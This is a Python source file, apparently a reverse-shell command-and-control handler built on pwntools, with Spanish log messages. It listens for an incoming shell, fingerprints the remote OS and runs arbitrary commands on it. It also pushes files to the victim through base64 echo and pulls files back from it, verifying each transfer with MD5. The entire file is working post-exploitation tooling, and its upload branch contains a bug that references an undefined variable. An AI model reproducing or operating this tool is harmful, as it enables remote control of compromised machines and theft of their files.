
from pwn import listen, log
import os
import base64
import time
import re
import signal
import hashlib
import threading


TOOLS_FOLDER = 'tools'
UPLOAD_FOLDER = 'uploads'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DOWNLOAD_FOLDER = os.path.join(BASE_DIR, "downloads")


conn = None
server = None

def clean_ansi(text):
    ansi_escape = re.compile(r'\x1b(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])|\x07|\x0f|\x0e')
    cleaned = ansi_escape.sub('', text)
    prompt_pattern = re.compile(r'^\d+;[a-zA-Z0-9_-]+@[^:]+:.*$')

    filtered_lines = []
    for line in cleaned.split('\n'):
        if not prompt_pattern.match(line.strip()):
            filtered_lines.append(line.strip())

    return '\n'.join(filtered_lines)

def get_clean_response(cmd):
    """Ejecuta un comando en la shell remota y devuelve la respuesta limpia."""
    conn.sendline(cmd.encode())
    conn.recvline(timeout=0.5)
    response = conn.recvline(timeout=2).decode(errors='ignore').strip()
    return clean_ansi(response) if response and response.lower() != cmd else None



def sigint_handler(signum, frame):
    if conn:
        conn.sendline(b'kill -2 $$')

def detect_remote_os():
    try:
        conn.sendline(b"uname")
        conn.recvline(timeout=0.5) 
        output = clean_ansi(conn.recvrepeat(0.5).decode(errors='ignore').strip())

        if output and "linux" in output.lower():
            return "Linux"

        conn.sendline(b"ver")
        time.sleep(0.5)
        response = clean_ansi(conn.recvline(timeout=1).decode(errors='ignore').strip())

        if response and "Windows" in response:
            return "Windows"

        return "Unknown"
    except Exception as e:
        log.error(f"Error detecting remote OS: {e}")
        return "Error"



def start_listener(port: int):
    global conn, server
    server = listen(port)
    log.success(f"Listening on port {port}...")
    conn = server.wait_for_connection()
    
    if conn:
        log.success(f"Connection received from {conn.rhost}")

        if threading.current_thread() is threading.main_thread():
            signal.signal(signal.SIGINT, sigint_handler)

        return conn, True



def stop_listener():
    global conn, server
    if server:
        try:
            server.close()
            log.success("Listener stopped.")
        except Exception as e:
            log.error(f"Error stopping listener: {e}")


def get_local_md5(local_file):
    try:
        with open(local_file, 'rb') as f:
            return hashlib.md5(f.read()).hexdigest()
    except Exception as e:
        log.error(f"Error obteniendo MD5 local: {e}")
        return None

def get_remote_md5(path):
    try:
        conn.sendline(f"md5sum {path}".encode())
        conn.recvline(timeout=0.5)
        result = clean_ansi(conn.recvrepeat(1).decode(errors='ignore'))
        match = re.search(r'^([a-fA-F0-9]{32})', result)
        return match.group(1) if match else None
    except Exception as e:
        log.error(f"Error obteniendo MD5 remoto: {e}")
        return None

def send_command(cmd):
    
    if cmd.startswith("upload "):
        path = cmd.split(" ", 1)[1]
        upload_file(path)
        local_md5 = get_local_md5(local_file)
        remote_md5 = get_remote_md5(os.path.basename(path))

        return {
            "type": "file",
            "path": path,
            "local_md5": local_md5,
            "remote_md5": remote_md5,
            "success": local_md5 == remote_md5
        }

    elif cmd.startswith("download "):
        path = cmd.split(" ", 1)[1]
        local_md5, remote_md5 = download_file(path)
        #local_file = os.path.join(DOWNLOAD_FOLDER, os.path.basename(path))
        #local_md5 = get_local_md5(local_file)
        #remote_md5 = get_remote_md5(os.path.basename(path))

        return {
            "type": "file",
            "path": path,
            "local_md5": local_md5,
            "remote_md5": remote_md5,
            "success": local_md5 == remote_md5
        }

    # Comando normal
    conn.sendline(cmd.encode())
    time.sleep(1)
    output = conn.recvrepeat(1).decode(errors='ignore').strip()
    return {"type": "output", "output": clean_ansi(output)}


def upload_file(file_path):
    try:
        with open(file_path, "rb") as f:
            file_data = base64.b64encode(f.read()).decode()

        conn.sendline(f"echo {file_data} | base64 -d > {os.path.basename(file_path)}".encode())
        log.info(f"Subiendo {file_path}")

        local_md5 = get_local_md5(file_path)
        remote_md5 = get_remote_md5(os.path.basename(file_path))

        if local_md5 and remote_md5:
            log.info(f"\n[+] MD5 local:  {local_md5}")
            log.info(f"[+] MD5 remoto: {remote_md5}")

            if local_md5 == remote_md5:
                log.success("✔️ Integridad verificada: los hashes coinciden.")
            else:
                log.warning("❌ Advertencia: los hashes NO coinciden. Puede haber corrupción en la transferencia.")

    except Exception as e:
        log.error(f"Error al subir el archivo: {e}")

def download_file(file_path):
    try:
        local_file = os.path.join(DOWNLOAD_FOLDER, os.path.basename(file_path))

        print("DOWNLOADS")
        print(local_file)
        conn.sendline(f"base64 {file_path}".encode())
        time.sleep(1)  # Le damos tiempo a la shell remota

        raw_data = conn.recvrepeat(3)  # Ajusta si necesitas más tiempo
        decoded_data = raw_data.decode(errors='ignore')

        # Extraemos solo la parte que parece base64 (omitimos prompts o basura ANSI)
        base64_lines = []
        for line in decoded_data.splitlines():
            if re.match(r'^[A-Za-z0-9+/=]+$', line.strip()):
                base64_lines.append(line.strip())

        file_data = ''.join(base64_lines)

        # Aseguramos padding
        missing_padding = len(file_data) % 4
        if missing_padding:
            file_data += '=' * (4 - missing_padding)

        with open(local_file, "wb") as f:
            f.write(base64.b64decode(file_data))

        log.success(f"Archivo {file_path} descargado.")
        print("LOCAL")
        print(local_file);
        local_md5 = get_local_md5(local_file)
        remote_md5 = get_remote_md5(file_path)

        if local_md5 and remote_md5:
            log.info(f"[+] MD5 local:  {local_md5}")
            log.info(f"[+] MD5 remoto: {remote_md5}")

            if local_md5 == remote_md5:
                log.success("✔️ Integridad verificada: los hashes coinciden.")
            else:
                log.warning("❌ Advertencia: los hashes NO coinciden. Puede haber corrupción en la transferencia.")
        print("OK")
        return local_md5, remote_md5
            
    except base64.binascii.Error as e:
        log.error(f"Error al decodificar Base64: {e}")
    except Exception as e:
        log.error(f"Error al descargar el archivo: {e}")
